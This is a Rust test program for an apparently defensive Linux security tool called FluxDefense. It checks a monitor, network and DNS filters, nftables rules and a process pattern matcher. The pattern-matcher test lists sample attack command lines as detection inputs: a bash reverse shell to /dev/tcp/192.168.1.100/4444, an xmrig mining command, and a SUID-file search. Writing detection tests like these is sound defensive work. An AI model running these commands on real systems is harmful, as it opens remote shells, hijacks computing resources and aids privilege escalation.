use anyhow::Result;
use tracing::{info, error};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::thread;
use std::path::PathBuf;

use fluxdefense::linux_security::{
    EnhancedSecurityMonitor, SecurityPolicy, EnforcementMode,
    NetworkFilter, NetworkFilterRule, FilterAction, Protocol, Direction,
    IpMatcher, PortMatcher, NftRule,
    NetfilterManager, NetfilterRule, RatePer,
    DnsFilter, DnsFilterConfig, DnsEvent, DnsAction,
    PatternMatcher, ProcessChain,
};
use fluxdefense::monitor::SecurityEvent;

fn main() -> Result<()> {
    // Initialize logging
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::DEBUG)
        .init();

    info!("Starting FluxDefense Phase 1 Component Test");
    
    // Check if running as root
    let uid = unsafe { libc::geteuid() };
    if uid != 0 {
        error!("This test requires root privileges for full functionality");
        println!("\nPlease run with: sudo {}", std::env::args().next().unwrap());
        return Ok(());
    }
    
    // Test components
    test_enhanced_monitor()?;
    test_network_filter()?;
    test_netfilter_manager()?;
    test_dns_filter()?;
    test_pattern_matcher()?;
    
    info!("All Phase 1 component tests completed!");
    
    Ok(())
}

fn test_enhanced_monitor() -> Result<()> {
    println!("\n=== Testing Enhanced Security Monitor ===");
    
    let events = Arc::new(Mutex::new(Vec::new()));
    let events_clone = Arc::clone(&events);
    
    let mut monitor = EnhancedSecurityMonitor::new(move |event: SecurityEvent| {
        println!("[MONITOR] Security Event: {:?}", event.event_type);
        events_clone.lock().unwrap().push(event);
    })?;
    
    // Configure policy
    monitor.set_enforcement_mode(EnforcementMode::Permissive)?;
    monitor.add_allowed_path(PathBuf::from("/usr/bin"))?;
    monitor.add_denied_path(PathBuf::from("/etc/shadow"))?;
    
    // Start monitoring
    monitor.start()?;
    println!("✓ Enhanced monitor started successfully");
    
    // Let it run for a few seconds
    thread::sleep(Duration::from_secs(5));
    
    // Check events
    let captured_events = events.lock().unwrap();
    println!("✓ Captured {} security events", captured_events.len());
    
    monitor.stop()?;
    println!("✓ Enhanced monitor stopped successfully");
    
    Ok(())
}

fn test_network_filter() -> Result<()> {
    println!("\n=== Testing Network Filter ===");
    
    let mut filter = NetworkFilter::new(|event| {
        match event {
            fluxdefense::linux_security::NetworkEvent::PacketCaptured { 
                protocol, source, destination, action, .. 
            } => {
                println!("[FILTER] Packet: {:?} {} -> {} Action: {:?}", 
                    protocol, source.0, destination.0, action);
            }
            fluxdefense::linux_security::NetworkEvent::DnsQuery { 
                domain, action, .. 
            } => {
                println!("[FILTER] DNS Query: {} Action: {:?}", domain, action);
            }
            _ => {}
        }
    })?;
    
    // Add some rules
    filter.add_rule(NetworkFilterRule {
        id: "block_telnet".to_string(),
        name: "Block Telnet".to_string(),
        direction: Direction::Both,
        action: FilterAction::Block,
        protocol: Some(Protocol::Tcp),
        source_ip: None,
        dest_ip: None,
        source_port: None,
        dest_port: Some(PortMatcher::Single(23)),
        priority: 100,
        enabled: true,
    })?;
    
    filter.add_dns_blacklist("malware.com".to_string())?;
    
    println!("✓ Network filter configured");
    
    // Note: Actual packet capture would require pcap permissions
    println!("✓ Network filter test completed (capture requires network interface)");
    
    Ok(())
}

fn test_netfilter_manager() -> Result<()> {
    println!("\n=== Testing Netfilter Manager ===");
    
    let mut manager = NetfilterManager::new()?;
    
    // Try to initialize (requires nftables)
    match manager.initialize() {
        Ok(_) => {
            println!("✓ Netfilter manager initialized");
            
            // Add some basic rules
            manager.allow_established()?;
            manager.log_and_drop_invalid()?;
            manager.rate_limit_port(22, 10, RatePer::Minute)?;
            
            println!("✓ Added netfilter rules");
            
            // Cleanup
            manager.cleanup()?;
            println!("✓ Netfilter cleanup completed");
        }
        Err(e) => {
            println!("⚠ Netfilter not available: {}", e);
            println!("  (This is normal if nftables is not installed)");
        }
    }
    
    Ok(())
}

fn test_dns_filter() -> Result<()> {
    println!("\n=== Testing DNS Filter ===");
    
    let filter = DnsFilter::new()?;
    
    // Load default blacklists
    filter.load_default_blacklists()?;
    println!("✓ Loaded DNS blacklists");
    
    // Add custom entries
    filter.add_blacklist_domain("evil-domain.com".to_string())?;
    filter.add_whitelist_domain("trusted.com".to_string())?;
    
    // Test DGA detection
    let test_domains = vec![
        "google.com",
        "asdkjhqwlekjhasdlkjh.com",
        "facebook.com",
        "zxcvbnmasdfghjkl.net",
    ];
    
    println!("Testing DGA detection:");
    for domain in test_domains {
        let is_dga = filter.is_dga_domain(domain);
        println!("  {} -> DGA: {}", domain, is_dga);
    }
    
    println!("✓ DNS filter test completed");
    
    Ok(())
}

fn test_pattern_matcher() -> Result<()> {
    println!("\n=== Testing Pattern Matcher ===");
    
    let matcher = PatternMatcher::new()?;
    
    // Test various suspicious patterns
    let test_processes = vec![
        // Crypto miner
        ("xmrig", vec!["xmrig", "--pool", "pool.minexmr.com", "--donate-level", "1"]),
        // Reverse shell
        ("bash", vec!["bash", "-i", ">&", "/dev/tcp/192.168.1.100/4444", "0>&1"]),
        // Normal process
        ("firefox", vec!["firefox", "--new-window", "https://example.com"]),
        // Privilege escalation attempt
        ("find", vec!["find", "/", "-perm", "-4000", "-type", "f"]),
    ];
    
    println!("Testing pattern detection:");
    for (name, cmdline) in test_processes {
        let process = fluxdefense::linux_security::ProcessInfo {
            pid: 1234,
            ppid: 1,
            name: name.to_string(),
            exe_path: Some(PathBuf::from(format!("/usr/bin/{}", name))),
            cmdline: cmdline.iter().map(|s| s.to_string()).collect(),
            uid: 1000,
            gid: 1000,
            start_time: 0,
        };
        
        let matches = matcher.check_process(&process, None);
        if !matches.is_empty() {
            println!("  {} -> Detected: {:?}", name, 
                matches.iter().map(|(p, _)| &p.name).collect::<Vec<_>>());
        } else {
            println!("  {} -> Clean", name);
        }
    }
    
    println!("✓ Pattern matcher test completed");
    
    Ok(())
}